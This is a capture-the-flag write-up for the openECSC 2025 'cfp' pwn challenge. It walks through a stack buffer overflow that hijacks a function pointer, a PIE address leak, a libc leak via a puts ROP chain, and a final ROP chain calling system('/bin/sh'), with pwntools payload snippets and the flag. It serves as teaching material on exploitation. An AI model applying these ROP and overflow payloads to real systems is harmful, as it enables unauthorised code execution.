# openECSC 2025

## Challenge: cfp

## Tags: pwn

## Difficulty: Easy

## Table of Contents

- [Solution Overview](#solution-overview)
- [Tools Used](#tools-used)
- [Solution](#solution)
- [Solution Script](#solution-script)
- [Flag](#flag)

### Solution Overview

This challenge exploits a classic buffer overflow vulnerability combined with function pointer hijacking. The program reads 256 bytes into a 100-byte buffer, allowing us to overwrite a function pointer stored on the stack. With PIE and NX enabled, the solution requires a three-stage attack: (1) leak the PIE base by overflowing without null terminators to leak the function pointer address, (2) build a ROP chain to call `puts(puts_got)` to leak libc addresses and return to main, (3) call `user_func()` to exit the loop cleanly and execute a final ROP chain that calls `system("/bin/sh")`. The challenge title hints at the vulnerability—C's function pointers become dangerous when stack-based and user-controlled.

### Tools Used

- Binary Ninja for reverse engineering
- pwntools for exploit development
- Docker for local testing
- Python 3

### Solution

When I first loaded the binary into Binary Ninja, I saw the challenge description: *"Wow! Did you know C supports function pointers?? That means C could be the hot new functional programming language!"*

**First thought**: "Function pointers in C... this is definitely about hijacking a function pointer on the stack."

#### Initial Analysis

Running `checksec` on the binary:

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
```

**Key observations**:
- No stack canary → Buffer overflows are possible
- NX enabled → Can't execute shellcode on the stack
- PIE enabled → Need to leak addresses first

#### Reverse Engineering

Using Binary Ninja, I found three interesting functions:

##### `main()` (decompiled):
```c
puts("Hello functional world! Whats your name?");
fgets(&buf, 0x100, stdin);  // Reads 256 bytes!

if (strncmp(&buf, "admin", 5) != 0)
    var_10_1 = user_func;
else
    var_10_1 = admin_func;

do {
    i = var_10_1(&buf);  // Calls function pointer!
} while (i != 0);

puts("bye!");
return 0;
```

##### `admin_func()`:
```c
printf("hello %s!\n", arg1);
puts("bossman, you get an extra loop!");
return 1;  // Non-zero keeps the loop going
```

##### `user_func()`:
```c
printf("hello %s.\n", arg1);
puts("you're just a regular user.");
return 0;  // Zero exits the loop
```

**Aha! The vulnerability**:
- `buf` is defined as `char buf[0x64]` (100 bytes)
- `fgets()` reads `0x100` (256 bytes)
- Classic buffer overflow: **156 bytes overflow!**

#### Finding the Stack Layout

Looking at the disassembly, I traced where everything lives:

```asm
lea     rax, [rbp-0x70]    ; buf starts here
mov     qword [rbp-0x8], rax ; function pointer here
```

**Stack layout**:
- `[rbp-0x70]` → Buffer start (112 bytes from rbp)
- `[rbp-0x8]` → Function pointer (8 bytes from rbp)
- `[rbp]` → Saved RBP
- `[rbp+0x8]` → Return address

**Offset calculation**:
- Buffer to function pointer: `0x70 - 0x8 = 0x68 = 104 bytes`
- Buffer to saved RBP: `0x70 = 112 bytes`
- Buffer to return address: `0x70 + 0x8 = 120 bytes`

**Key insight**: By overflowing 104 bytes, I can overwrite the function pointer. By overflowing 120+ bytes, I can control the return address!

#### Stage 1: Leaking PIE Base

**Problem**: With PIE enabled, I don't know where `admin_func`, `user_func`, or any gadgets are located.

**Solution**: Leak the function pointer itself!

Here's the trick: When `admin_func()` does `printf("hello %s!\n", arg1)`, the `%s` format specifier prints the buffer as a C string **until it hits a null byte**. 

If I send 104 bytes without a null terminator, the `%s` will continue reading past the buffer and print the function pointer value stored at `[rbp-0x8]`!

**Payload 1**:
```python
payload = b"admin" + b"B" * 99  # 104 bytes, no null
```

**Result**:
```
hello adminBBBBB...BBBB\xa9\x11\x00\x00\x00\x00!
```

The leaked bytes `\xa9\x11\x00\x00\x00\x00` are the last 6 bytes of the function pointer! (Addresses end with null bytes due to canonical form)

Reconstructing the full address:
```python
leaked_bytes = leaked_line[104:110]  # Extract 6 bytes
leaked_addr = u64(leaked_bytes + b'\x00\x00')  # Pad to 8 bytes
pie_base = leaked_addr - 0x11a9  # admin_func offset
```

**Success!** Now I know where everything is in the binary.

#### Stage 2: Leaking libc

**Problem**: I need `system()` to get a shell, but it's in libc. With ASLR, libc's base address is randomized.

**Solution**: Leak a libc address from the GOT (Global Offset Table).

The GOT contains pointers to libc functions after they've been resolved. If I can read the GOT entry for `puts`, I can calculate libc's base address.

**But how do I read the GOT?**

Remember: I can control the return address! When `admin_func()` returns, I can make it return to a ROP chain instead of back to main's loop.

**ROP Chain Plan**:
```
pop rdi              ; Set up argument
<puts_got_address>   ; Argument: address of puts in GOT  
puts@plt             ; Call puts(puts_got) to print the address
main                 ; Return to main for another round
```

**Wait, there's a problem**: If I overwrite the return address, the program will crash when the function pointer is called, before reaching my ROP chain!

**Solution**: Call `admin_func` via the function pointer (returns 1, loops back), but place the ROP chain at the return address. After the second loop iteration, when I want to trigger the ROP, I'll send different input.

Actually, **even better**: The function gets called, returns to main's loop code, loops back to ask for input again, and eventually when the loop exits (at the `puts("bye!")` line), main's epilogue executes `leave; ret`, which pops our ROP chain!

**Payload 2**:
```python
payload = b"A" * 104           # Fill buffer
payload += p64(admin_func)     # Function pointer (returns 1)
payload += b"B" * 8            # Saved RBP (doesn't matter)
payload += p64(pop_rdi)        # Start of ROP chain
payload += p64(puts_got)       # Argument
payload += p64(puts_plt)       # Call puts
payload += p64(main)           # Loop back to main
```

When the program loops, calls `admin_func` again, returns, and eventually `main` does its epilogue, my ROP chain executes!

**Result**: The output contains the leaked libc address:

```
bye!
\x20\xf4\x7d\xb7\xc3\x7f   ← This is puts@libc!
Hello functional world! Whats your name?
```

Calculating libc base:
```python
puts_libc = u64(leaked_bytes.ljust(8, b'\x00'))
libc_base = puts_libc - 0x84420  # puts offset in libc
system_addr = libc_base + 0x52290
binsh_addr = libc_base + 0x1b45bd
```

**Success!** Now I know where `system()` and the `/bin/sh` string are in libc.

#### Stage 3: Popping a Shell

**Final objective**: Call `system("/bin/sh")` to get a shell.

**The setup**:
- I'm back at the "Whats your name?" prompt (third iteration)
- I know PIE base → I know all gadget addresses
- I know libc base → I know `system()` and `/bin/sh` addresses
- I can overflow again

**The plan**:
1. Overflow the buffer
2. Set function pointer to `user_func` (returns 0, exits loop)
3. Place ROP chain at return address: `system("/bin/sh")`
4. When `user_func` returns 0, the loop exits, main does `puts("bye!")`, then returns, executing our ROP

**Important detail**: The `system()` function requires 16-byte stack alignment (due to SSE instructions). I need a `ret` gadget before calling `system()` to adjust the stack.

**Final Payload**:
```python
payload = b"A" * 104
payload += p64(user_func)      # Returns 0, exits loop
payload += p64(0)              # Saved RBP
payload += p64(pop_rdi)        # Set rdi = "/bin/sh"
payload += p64(binsh_addr)
payload += p64(ret_gadget)     # Stack alignment!
payload += p64(system_addr)    # Call system
```

**Execution flow**:
1. Loop calls `user_func(&buf)`
2. `user_func` prints message, returns 0
3. Loop exits
4. `main` does `puts("bye!")`
5. `main` epilogue: `leave; ret`
6. `ret` pops our ROP chain address
7. `pop rdi` → `binsh_addr` → `ret` → `system`
8. **Shell spawned!**

#### Getting the Flag

Once I had the shell:

```bash
$ cat /flag.txt
openECSC{v3ry_funct10n4l_v3ry_w0w}
```

**🎉 FLAG CAPTURED!**

#### Why This Worked

The beauty of this exploit is the three-stage approach:

1. **Information Leak** → Used the "admin" path and overflow without null bytes to leak the function pointer, calculating PIE base
2. **Libc Leak** → Leveraged the loop + return address control to build a ROP chain that leaks libc via `puts(got)`  
3. **Exploitation** → With all addresses known, crafted final ROP chain to call `system("/bin/sh")`

The challenge title was a perfect hint: "C supports function pointers" → The function pointer vulnerability is the entry point for the entire exploit chain!

### Solution Script

[exploit.py](exploit.py)

### Flag

**`openECSC{v3ry_funct10n4l_v3ry_w0w}`**
